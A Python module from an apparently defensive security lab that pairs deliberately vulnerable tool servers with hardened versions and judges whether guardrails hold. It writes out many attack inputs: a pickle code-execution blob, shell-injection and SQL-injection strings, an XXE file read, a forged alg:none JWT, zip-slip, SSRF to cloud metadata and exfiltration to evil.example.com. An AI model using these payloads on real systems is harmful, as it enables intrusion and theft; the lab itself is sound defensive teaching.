"""The Attack/Defend arena catalog — the red-vs-blue pairings.

Each :class:`ArenaCase` maps an attack to its vulnerable server, the hardened
twin, the tool to call, and the payloads. :func:`judge` then reads a tool result
and decides whether the guardrail held — the heuristic is deliberately explicit
(refusal phrases + an attack-success "proof" string) so the verdict is honest and
OS-independent rather than a black box.
"""

from __future__ import annotations

import base64
import io
import json
import pickle
import zipfile
from dataclasses import dataclass
from pathlib import Path

from ..config import REPO_ROOT
from ..guardrails.jwtsafe import sign_jwt

ATTACKS = REPO_ROOT / "attacks"
HARDENED = REPO_ROOT / "defense" / "hardened_servers"

# Must match attacks/_lab/safety.py — the lab's intentional opt-in friction. The
# arena only injects this into a vulnerable server's env after the user explicitly
# arms the lab in the UI, preserving the "never start vulnerable code by accident"
# guarantee.
LAB_ENV_VAR = "PURPLEMCP_LAB_ENABLED"
LAB_TOKEN = "i-understand-this-is-a-lab"


def _pickle_rce_blob() -> str:
    """A base64 pickle whose __reduce__ runs eval('PWN'+str(6*7)) when LOADED.

    Building it here is harmless — pickle.dumps never runs the payload; only the
    vulnerable server's pickle.loads would (and only after the lab is armed). The
    'PWN42' result can't appear unless code actually executed, which is the proof.
    """

    class _Proof:
        def __reduce__(self):
            return (eval, ("'PWN' + str(6 * 7)",))

    return base64.b64encode(pickle.dumps(_Proof())).decode()


_DESERIAL_BLOB = _pickle_rce_blob()


def _zip_blob(entries: dict[str, str]) -> str:
    """A base64 zip built from {member_name: content}. Used by the zip-slip case."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        for name, content in entries.items():
            zf.writestr(name, content)
    return base64.b64encode(buf.getvalue()).decode()


_CLEAN_ZIP = _zip_blob({"notes/hello.txt": "hi"})
_SLIP_ZIP = _zip_blob({"../19_ZIPSLIP_PROOF.txt": "PWNED-BY-ZIP-SLIP"})

# JWT case: a validly-signed guest token (benign) vs. a forged unsigned admin token.
_JWT_SECRET = "server-side-signing-secret"
_BENIGN_JWT = sign_jwt({"user": "alice", "role": "guest"}, _JWT_SECRET)


def _forged_admin_jwt() -> str:
    """An unsigned 'alg:none' JWT claiming admin — the forgery the attack sends."""
    def enc(raw: bytes) -> str:
        return base64.urlsafe_b64encode(raw).decode().rstrip("=")

    header = enc(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    payload = enc(json.dumps({"user": "mallory", "role": "admin"}).encode())
    return f"{header}.{payload}."


_FORGED_JWT = _forged_admin_jwt()

# XXE case: a plain profile (benign) vs. an external-entity payload reading /etc/hosts.
_XXE_BENIGN = "<profile>Alice</profile>"
_XXE_ATTACK = (
    '<?xml version="1.0"?>\n'
    '<!DOCTYPE profile [<!ENTITY xxe SYSTEM "file:///etc/hosts">]>\n'
    "<profile>&xxe;</profile>"
)


@dataclass(frozen=True)
class ArenaCase:
    id: str
    num: str
    title: str
    threat: str
    tool: str
    attack_args: dict
    vuln_path: Path
    hardened_path: Path
    guardrail: str
    explain: str
    proof: str = ""               # signature that the attack SUCCEEDED
    benign_args: dict | None = None  # optional "normal use" call
    needs_network: bool = False


CASES: list[ArenaCase] = [
    ArenaCase(
        id="command-injection",
        num="03",
        title="Command Injection",
        threat="A diagnostics tool shells out, so attacker metacharacters run as commands.",
        tool="ping",
        benign_args={"host": "127.0.0.1"},
        # The $((6*7)) only evaluates to 42 if a shell actually runs it, so the
        # proof string "PWNED-42" can never appear from the literal echoed back.
        attack_args={"host": "127.0.0.1; echo PWNED-$((6*7))"},
        proof="PWNED-42",
        vuln_path=ATTACKS / "03_command_injection" / "vulnerable_server.py",
        hardened_path=HARDENED / "safe_nettools.py",
        guardrail="guardrails.exec.safe_run — argv list, no shell, executable allowlist",
        explain="The vulnerable ping runs your input through a shell, so `; echo …` executes "
                "and $((6*7)) expands to 42. The hardened twin passes the host as one literal "
                "argv element, so the metacharacters are inert text and ping just can't "
                "resolve the 'host'.",
    ),
    ArenaCase(
        id="path-traversal",
        num="04",
        title="Path Traversal",
        threat="A file reader trusts its path, so `/etc/hosts` escapes the docs root.",
        tool="read_doc",
        benign_args={"path": "welcome.txt"},
        attack_args={"path": "/etc/hosts"},
        proof="localhost",
        vuln_path=ATTACKS / "04_path_traversal" / "vulnerable_server.py",
        hardened_path=HARDENED / "safe_docreader.py",
        guardrail="guardrails.paths.safe_resolve — canonicalize + confine to root",
        explain="An absolute path makes os.path.join ignore the intended root entirely. "
                "safe_resolve canonicalizes the path and rejects anything that lands "
                "outside the docs root — so the read is refused.",
    ),
    ArenaCase(
        id="ssrf",
        num="05",
        title="Server-Side Request Forgery",
        threat="A fetch tool will hit internal-only addresses like cloud metadata.",
        tool="fetch",
        benign_args={"url": "https://example.com"},
        attack_args={"url": "http://169.254.169.254/latest/meta-data/"},
        vuln_path=ATTACKS / "05_ssrf" / "vulnerable_server.py",
        hardened_path=HARDENED / "safe_fetcher.py",
        guardrail="guardrails.net.safe_get — scheme allowlist, blocks private/link-local IPs",
        explain="169.254.169.254 is the cloud metadata endpoint — reachable from the server, "
                "not the internet. The vulnerable fetch tries it; safe_get refuses link-local "
                "and private hosts outright.",
        needs_network=True,
    ),
    ArenaCase(
        id="token-theft",
        num="06",
        title="Token Theft / Confused Deputy",
        threat="A diagnostics tool dumps the secret API token straight into its output.",
        tool="get_debug_info",
        attack_args={},
        proof="sk-fake-DO-NOT-USE",
        vuln_path=ATTACKS / "06_token_theft" / "vulnerable_server.py",
        hardened_path=HARDENED / "safe_crm.py",
        guardrail="guardrails.secrets.scrub — strip secret shapes from tool output",
        explain="The vulnerable diagnostics tool prints `api_token=sk-fake-…` for anyone "
                "to read. The hardened twin runs scrub() over its output first, so the "
                "secret comes back as [REDACTED:…].",
    ),
    ArenaCase(
        id="data-exfiltration",
        num="09",
        title="Data Exfiltration",
        threat="A backup tool will POST your notes to any endpoint a caller names.",
        tool="backup_note",
        benign_args={"content": "Q3 board notes — internal only."},
        attack_args={
            "content": "Q3 board notes — internal only.",
            "endpoint": "https://evil.example.com/collect",
        },
        vuln_path=ATTACKS / "09_data_exfiltration" / "vulnerable_server.py",
        hardened_path=HARDENED / "safe_backup.py",
        guardrail="endpoint allowlist + guardrails.secrets.scrub + human approval",
        explain="The vulnerable backup sends raw content to whatever endpoint it's handed — "
                "a ready-made exfil channel. The hardened twin only sends to an allowlisted "
                "host and scrubs secrets first, so 'back up to evil.com' is refused.",
        needs_network=True,
    ),
    ArenaCase(
        id="sql-injection",
        num="10",
        title="SQL Injection",
        threat="A notes search builds SQL by string interpolation, so input rewrites the query.",
        tool="search_notes",
        benign_args={"query": "roadmap"},
        attack_args={"query": "%' OR 1=1 -- "},
        proof="RECOVERY-CODE-7F3A2B91",
        vuln_path=ATTACKS / "10_sql_injection" / "vulnerable_server.py",
        hardened_path=HARDENED / "safe_notes_search.py",
        guardrail="parameterized queries (? placeholders) + guardrails.like_escape",
        explain="The payload closes the LIKE string and adds `OR 1=1`, so every row returns — "
                "including the admin note's recovery code. The hardened twin binds the value as "
                "a parameter, so it's matched literally and the admin note stays hidden.",
    ),
    ArenaCase(
        id="template-injection",
        num="11",
        title="Template / Format-String Injection",
        threat="A greeting tool runs str.format on a caller-supplied template.",
        tool="render_welcome",
        attack_args={
            "template": "{app.__init__.__globals__[SECRET_TOKEN]}",
            "username": "guest",
        },
        proof="TMPL-SECRET-4417",
        vuln_path=ATTACKS / "11_template_injection" / "vulnerable_server.py",
        hardened_path=HARDENED / "safe_templater.py",
        guardrail="guardrails.safe_format — string.Template ($name), no attribute access",
        explain="The format mini-language walks app → __init__ → __globals__ and reads the "
                "module's SECRET_TOKEN. safe_format uses $-placeholders that can't reach "
                "attributes or globals, so the same payload comes back as inert text.",
    ),
    ArenaCase(
        id="insecure-deserialization",
        num="13",
        title="Insecure Deserialization",
        threat="A 'restore session' tool pickle.loads a caller-supplied blob — pickle runs code.",
        tool="load_session",
        attack_args={"blob": _DESERIAL_BLOB},
        proof="PWN42",
        vuln_path=ATTACKS / "13_insecure_deserialization" / "vulnerable_server.py",
        hardened_path=HARDENED / "safe_state_loader.py",
        guardrail="guardrails.safe_loads — JSON only, refuses pickle streams",
        explain="The pickle's __reduce__ makes loading call eval('PWN'+str(6*7)) — 'PWN42' only "
                "appears if code executed on the server. The hardened twin decodes as JSON, which "
                "can't call code, and refuses the pickle stream outright.",
    ),
    ArenaCase(
        id="broken-access-control",
        num="14",
        title="Broken Access Control (IDOR)",
        threat="A records tool returns any row by id, ignoring who is asking.",
        tool="get_record",
        benign_args={"record_id": 1},
        attack_args={"record_id": 2},
        proof="SSN-417-55-0199",
        vuln_path=ATTACKS / "14_broken_access_control" / "vulnerable_server.py",
        hardened_path=HARDENED / "safe_records.py",
        guardrail="guardrails.authz.assert_owner — bind every access to the caller's identity",
        explain="Acting as 'alice', record #1 is hers but #2 is bob's. The vulnerable tool only "
                "checks the id exists; the hardened twin checks the record's owner against the "
                "session principal, so bob's SSN is refused.",
    ),
    ArenaCase(
        id="unrestricted-file-write",
        num="15",
        title="Unrestricted File Write",
        threat="A save-note tool joins your path with no confinement, so `..` escapes the root.",
        tool="save_note",
        benign_args={"path": "todo.txt", "content": "buy milk"},
        attack_args={"path": "../15_ESCAPED_PROOF.txt", "content": "PWNED-WRITE-ESCAPE"},
        vuln_path=ATTACKS / "15_unrestricted_file_write" / "vulnerable_server.py",
        hardened_path=HARDENED / "safe_writer.py",
        guardrail="guardrails.paths.safe_resolve — confine writes to the root (must_exist=False)",
        explain="The vulnerable tool writes to '../15_ESCAPED_PROOF.txt', landing OUTSIDE the notes "
                "root (a real attacker would target ~/.zshrc). The hardened twin resolves the path "
                "through safe_resolve and refuses anything that escapes.",
    ),
    ArenaCase(
        id="output-injection",
        num="17",
        title="Output / Log Injection",
        threat="A logging tool echoes untrusted text, so it can forge log lines + control chars.",
        tool="record_event",
        benign_args={"message": "user logged in"},
        attack_args={"message": "ok\n[SECURITY] AUTH_BYPASS_GRANTED for attacker\x1b[2J"},
        proof="\n[SECURITY] AUTH_BYPASS_GRANTED",
        vuln_path=ATTACKS / "17_output_injection" / "vulnerable_server.py",
        hardened_path=HARDENED / "safe_logger.py",
        guardrail="guardrails.framing.sanitize_output — strip control chars, escape newlines",
        explain="The payload's newline forges a second '[SECURITY]' log line and an ANSI sequence "
                "clears the screen. The hardened twin sanitizes the message, escaping the newline so "
                "the forged line becomes inert inline text.",
    ),
    ArenaCase(
        id="eval-injection",
        num="18",
        title="Eval / Expression Injection",
        threat="A calculator tool runs eval() on the expression — arbitrary code.",
        tool="calculate",
        benign_args={"expr": "2 + 3 * 4"},
        # 'PWN42' is computed ('PWN' + str(6*7)); it is not a literal in the input.
        attack_args={"expr": "'PWN' + str(6 * 7)"},
        proof="PWN42",
        vuln_path=ATTACKS / "18_eval_injection" / "vulnerable_server.py",
        hardened_path=HARDENED / "safe_calculator.py",
        guardrail="guardrails.safe_eval — ast-validated arithmetic only",
        explain="eval evaluates Python, not math: 'PWN'+str(6*7) returns PWN42 (and os.popen would "
                "spawn a shell). safe_eval walks the AST and allows only numbers + arithmetic "
                "operators, so the expression is refused.",
    ),
    ArenaCase(
        id="zip-slip",
        num="19",
        title="Zip Slip / Archive Traversal",
        threat="An unpack tool trusts archive member names, so '../x' escapes the dir.",
        tool="unpack",
        benign_args={"zip_b64": _CLEAN_ZIP},
        attack_args={"zip_b64": _SLIP_ZIP},
        vuln_path=ATTACKS / "19_zip_slip" / "vulnerable_server.py",
        hardened_path=HARDENED / "safe_unpacker.py",
        guardrail="guardrails.paths.safe_resolve — confine every archive member",
        explain="The archive's member '../19_ZIPSLIP_PROOF.txt' makes the vulnerable tool write "
                "OUTSIDE its unpack folder. The hardened twin resolves each member under the root "
                "and refuses anything that escapes.",
    ),
    ArenaCase(
        id="mass-assignment",
        num="20",
        title="Mass Assignment / Privilege Escalation",
        threat="An update tool binds every field the caller sends, including role.",
        tool="update_profile",
        benign_args={"updates": {"display_name": "Mallory M."}},
        attack_args={"updates": {"display_name": "Mallory M.", "role": "admin", "is_admin": True}},
        proof="role=admin",
        vuln_path=ATTACKS / "20_mass_assignment" / "vulnerable_server.py",
        hardened_path=HARDENED / "safe_profile.py",
        guardrail="guardrails.assert_assignable — editable-field allowlist",
        explain="The update smuggles role=admin alongside the display name. The vulnerable tool "
                "applies every key; the hardened twin allowlists editable fields, so role/is_admin "
                "are refused.",
    ),
    ArenaCase(
        id="csv-injection",
        num="21",
        title="CSV / Formula Injection",
        threat="An export tool writes cells verbatim, so a leading '=' becomes a formula.",
        tool="export_row",
        benign_args={"name": "Alice", "note": "friend"},
        attack_args={"name": "Alice", "note": "=DANGER_FORMULA(2+3)"},
        proof=",=DANGER_FORMULA",
        vuln_path=ATTACKS / "21_csv_injection" / "vulnerable_server.py",
        hardened_path=HARDENED / "safe_csv.py",
        guardrail="guardrails.csvsafe.escape_formula — force formula cells to text",
        explain="The note cell '=DANGER_FORMULA(2+3)' is a live formula a spreadsheet runs on open. "
                "The hardened twin prefixes a quote so the cell is text and the ',=' formula start "
                "disappears.",
    ),
    ArenaCase(
        id="unbounded-output",
        num="22",
        title="Unbounded Output / Context Flooding",
        threat="A log tool returns however much output the caller asks for — a context flood.",
        tool="dump_logs",
        benign_args={"lines": 10},
        attack_args={"lines": 50000},
        proof="EOF-LOG-MARKER-7731",
        vuln_path=ATTACKS / "22_unbounded_output" / "vulnerable_server.py",
        hardened_path=HARDENED / "safe_logreader.py",
        guardrail="guardrails.cap_text — truncate every result to a fixed byte budget",
        explain="dump_logs(lines=50000) returns ~2 MB on the vulnerable server, flooding the context "
                "and ending in an EOF marker. The hardened twin wraps the result in cap_text, capping "
                "it to 2 KB — so the marker (and the flood) never arrive.",
    ),
    ArenaCase(
        id="argument-injection",
        num="23",
        title="Argument / Flag Injection",
        threat="A lookup tool splits the caller's value into argv, so part of it becomes an option.",
        tool="lookup",
        benign_args={"user": "alice"},
        attack_args={"user": "alice --debug"},
        proof="ARGINJ-SECRET-5521",
        vuln_path=ATTACKS / "23_argument_injection" / "vulnerable_server.py",
        hardened_path=HARDENED / "safe_runner.py",
        guardrail="guardrails.safe_argv — pass values whole + a `--` end-of-options guard",
        explain="Splitting 'alice --debug' makes --debug a separate argv element, read as an option that "
                "dumps internal_api_key. The hardened twin passes the value whole after a `--`, so it's "
                "one operand and the secret stays hidden.",
    ),
    ArenaCase(
        id="jwt-none",
        num="24",
        title="Insecure JWT Verification",
        threat="A tool trusts a JWT's claims without verifying its signature.",
        tool="whoami",
        benign_args={"token": _BENIGN_JWT},
        attack_args={"token": _FORGED_JWT},
        proof="JWT-ADMIN-SECRET-9921",
        vuln_path=ATTACKS / "24_insecure_jwt" / "vulnerable_server.py",
        hardened_path=HARDENED / "safe_jwt_auth.py",
        guardrail="guardrails.jwtsafe.verify_jwt — require HS256, verify the signature",
        explain="The forged token sets alg:none and an empty signature while claiming role=admin. "
                "The vulnerable tool decodes the payload without checking anything, so it leaks the "
                "admin secret. verify_jwt demands HS256 and a valid HMAC signature, so the forgery "
                "is refused.",
    ),
    ArenaCase(
        id="xxe",
        num="25",
        title="XML External Entity (XXE)",
        threat="An XML parser resolves external entities, so a document can read local files.",
        tool="parse_profile",
        benign_args={"xml_text": _XXE_BENIGN},
        attack_args={"xml_text": _XXE_ATTACK},
        proof="localhost",
        vuln_path=ATTACKS / "25_xxe" / "vulnerable_server.py",
        hardened_path=HARDENED / "safe_xml_parser.py",
        guardrail="guardrails.safexml.safe_parse_xml — reject DOCTYPE/ENTITY before parsing",
        explain="The payload defines an external entity pointing at file:///etc/hosts and expands it in "
                "the document body, so the vulnerable parser returns the file's contents (it contains "
                "'localhost'). safe_parse_xml refuses any DOCTYPE/ENTITY declaration up front, so the "
                "entity never resolves.",
    ),
    ArenaCase(
        id="regex-injection",
        num="26",
        title="Regex Injection",
        threat="A log search compiles the caller's pattern as a regex, so metacharacters widen the match.",
        tool="search_logs",
        benign_args={"pattern": "alice"},
        attack_args={"pattern": ".*"},
        proof="REGEX-SECRET-3310",
        vuln_path=ATTACKS / "26_regex_injection" / "vulnerable_server.py",
        hardened_path=HARDENED / "safe_log_search.py",
        guardrail="guardrails.saferegex.literal_search — escape the input, match as a literal substring",
        explain="The '.*' pattern matches every log line on the vulnerable server, leaking the admin "
                "recovery code. literal_search escapes the input so '.*' is matched literally — it "
                "appears in no line, so the secret stays hidden.",
    ),
    ArenaCase(
        id="open-redirect",
        num="27",
        title="Open Redirect",
        threat="A link builder trusts any destination host, so it will redirect users off-site.",
        tool="build_redirect",
        benign_args={"target": "https://app.example.com/dashboard"},
        attack_args={"target": "https://evil.example.com/phish"},
        proof="Location: https://evil.example.com",
        vuln_path=ATTACKS / "27_open_redirect" / "vulnerable_server.py",
        hardened_path=HARDENED / "safe_redirector.py",
        guardrail="guardrails.redirects.safe_redirect — http(s) scheme + host allowlist",
        explain="The vulnerable builder emits a redirect to evil.example.com. safe_redirect parses the "
                "target and refuses any host that is not on the allowlist, so the off-site phishing "
                "redirect is rejected while on-site links still work.",
    ),
]

CASES_BY_ID = {c.id: c for c in CASES}

# Phrases that signal a guardrail engaged (refused / neutralized the input).
_DEFENDED = (
    "refused", "refuses", "blocked", "allowlist", "not in the", "not allowed",
    "pathtraversal", "ssrf", "commandnotallowed", "[redacted", "scrubbed",
    "cannot resolve", "unknown host", "name or service not known",
    "could not resolve", "name resolution",
)


@dataclass(frozen=True)
class Verdict:
    label: str
    kind: str  # "bad" (attacker wins) | "good" (defender wins) | "warn"
    leaked: bool
    defended: bool


def _signals(output: str, proof: str) -> tuple[bool, bool]:
    low = (output or "").lower()
    defended = any(phrase in low for phrase in _DEFENDED)
    leaked = bool(proof) and proof.lower() in low
    return leaked, defended


def judge(output: str, case: ArenaCase, *, hardened: bool) -> Verdict:
    """Decide what a tool result means for the attacker/defender."""
    leaked, defended = _signals(output, case.proof)
    if hardened:
        if leaked:
            return Verdict("LEAKED — regression!", "bad", leaked, defended)
        # The attack's success signature is absent: the guardrail neutralized it,
        # whether by an explicit refusal or by simply not producing the leak.
        if case.proof or defended:
            return Verdict("BLOCKED", "good", leaked, defended)
        return Verdict("no guardrail hit", "warn", leaked, defended)
    # vulnerable side
    if leaked:
        return Verdict("EXPLOITED — data leaked", "bad", leaked, defended)
    if defended:
        return Verdict("held (unexpected)", "good", leaked, defended)
    return Verdict("EXPOSED — no guardrail", "bad", leaked, defended)
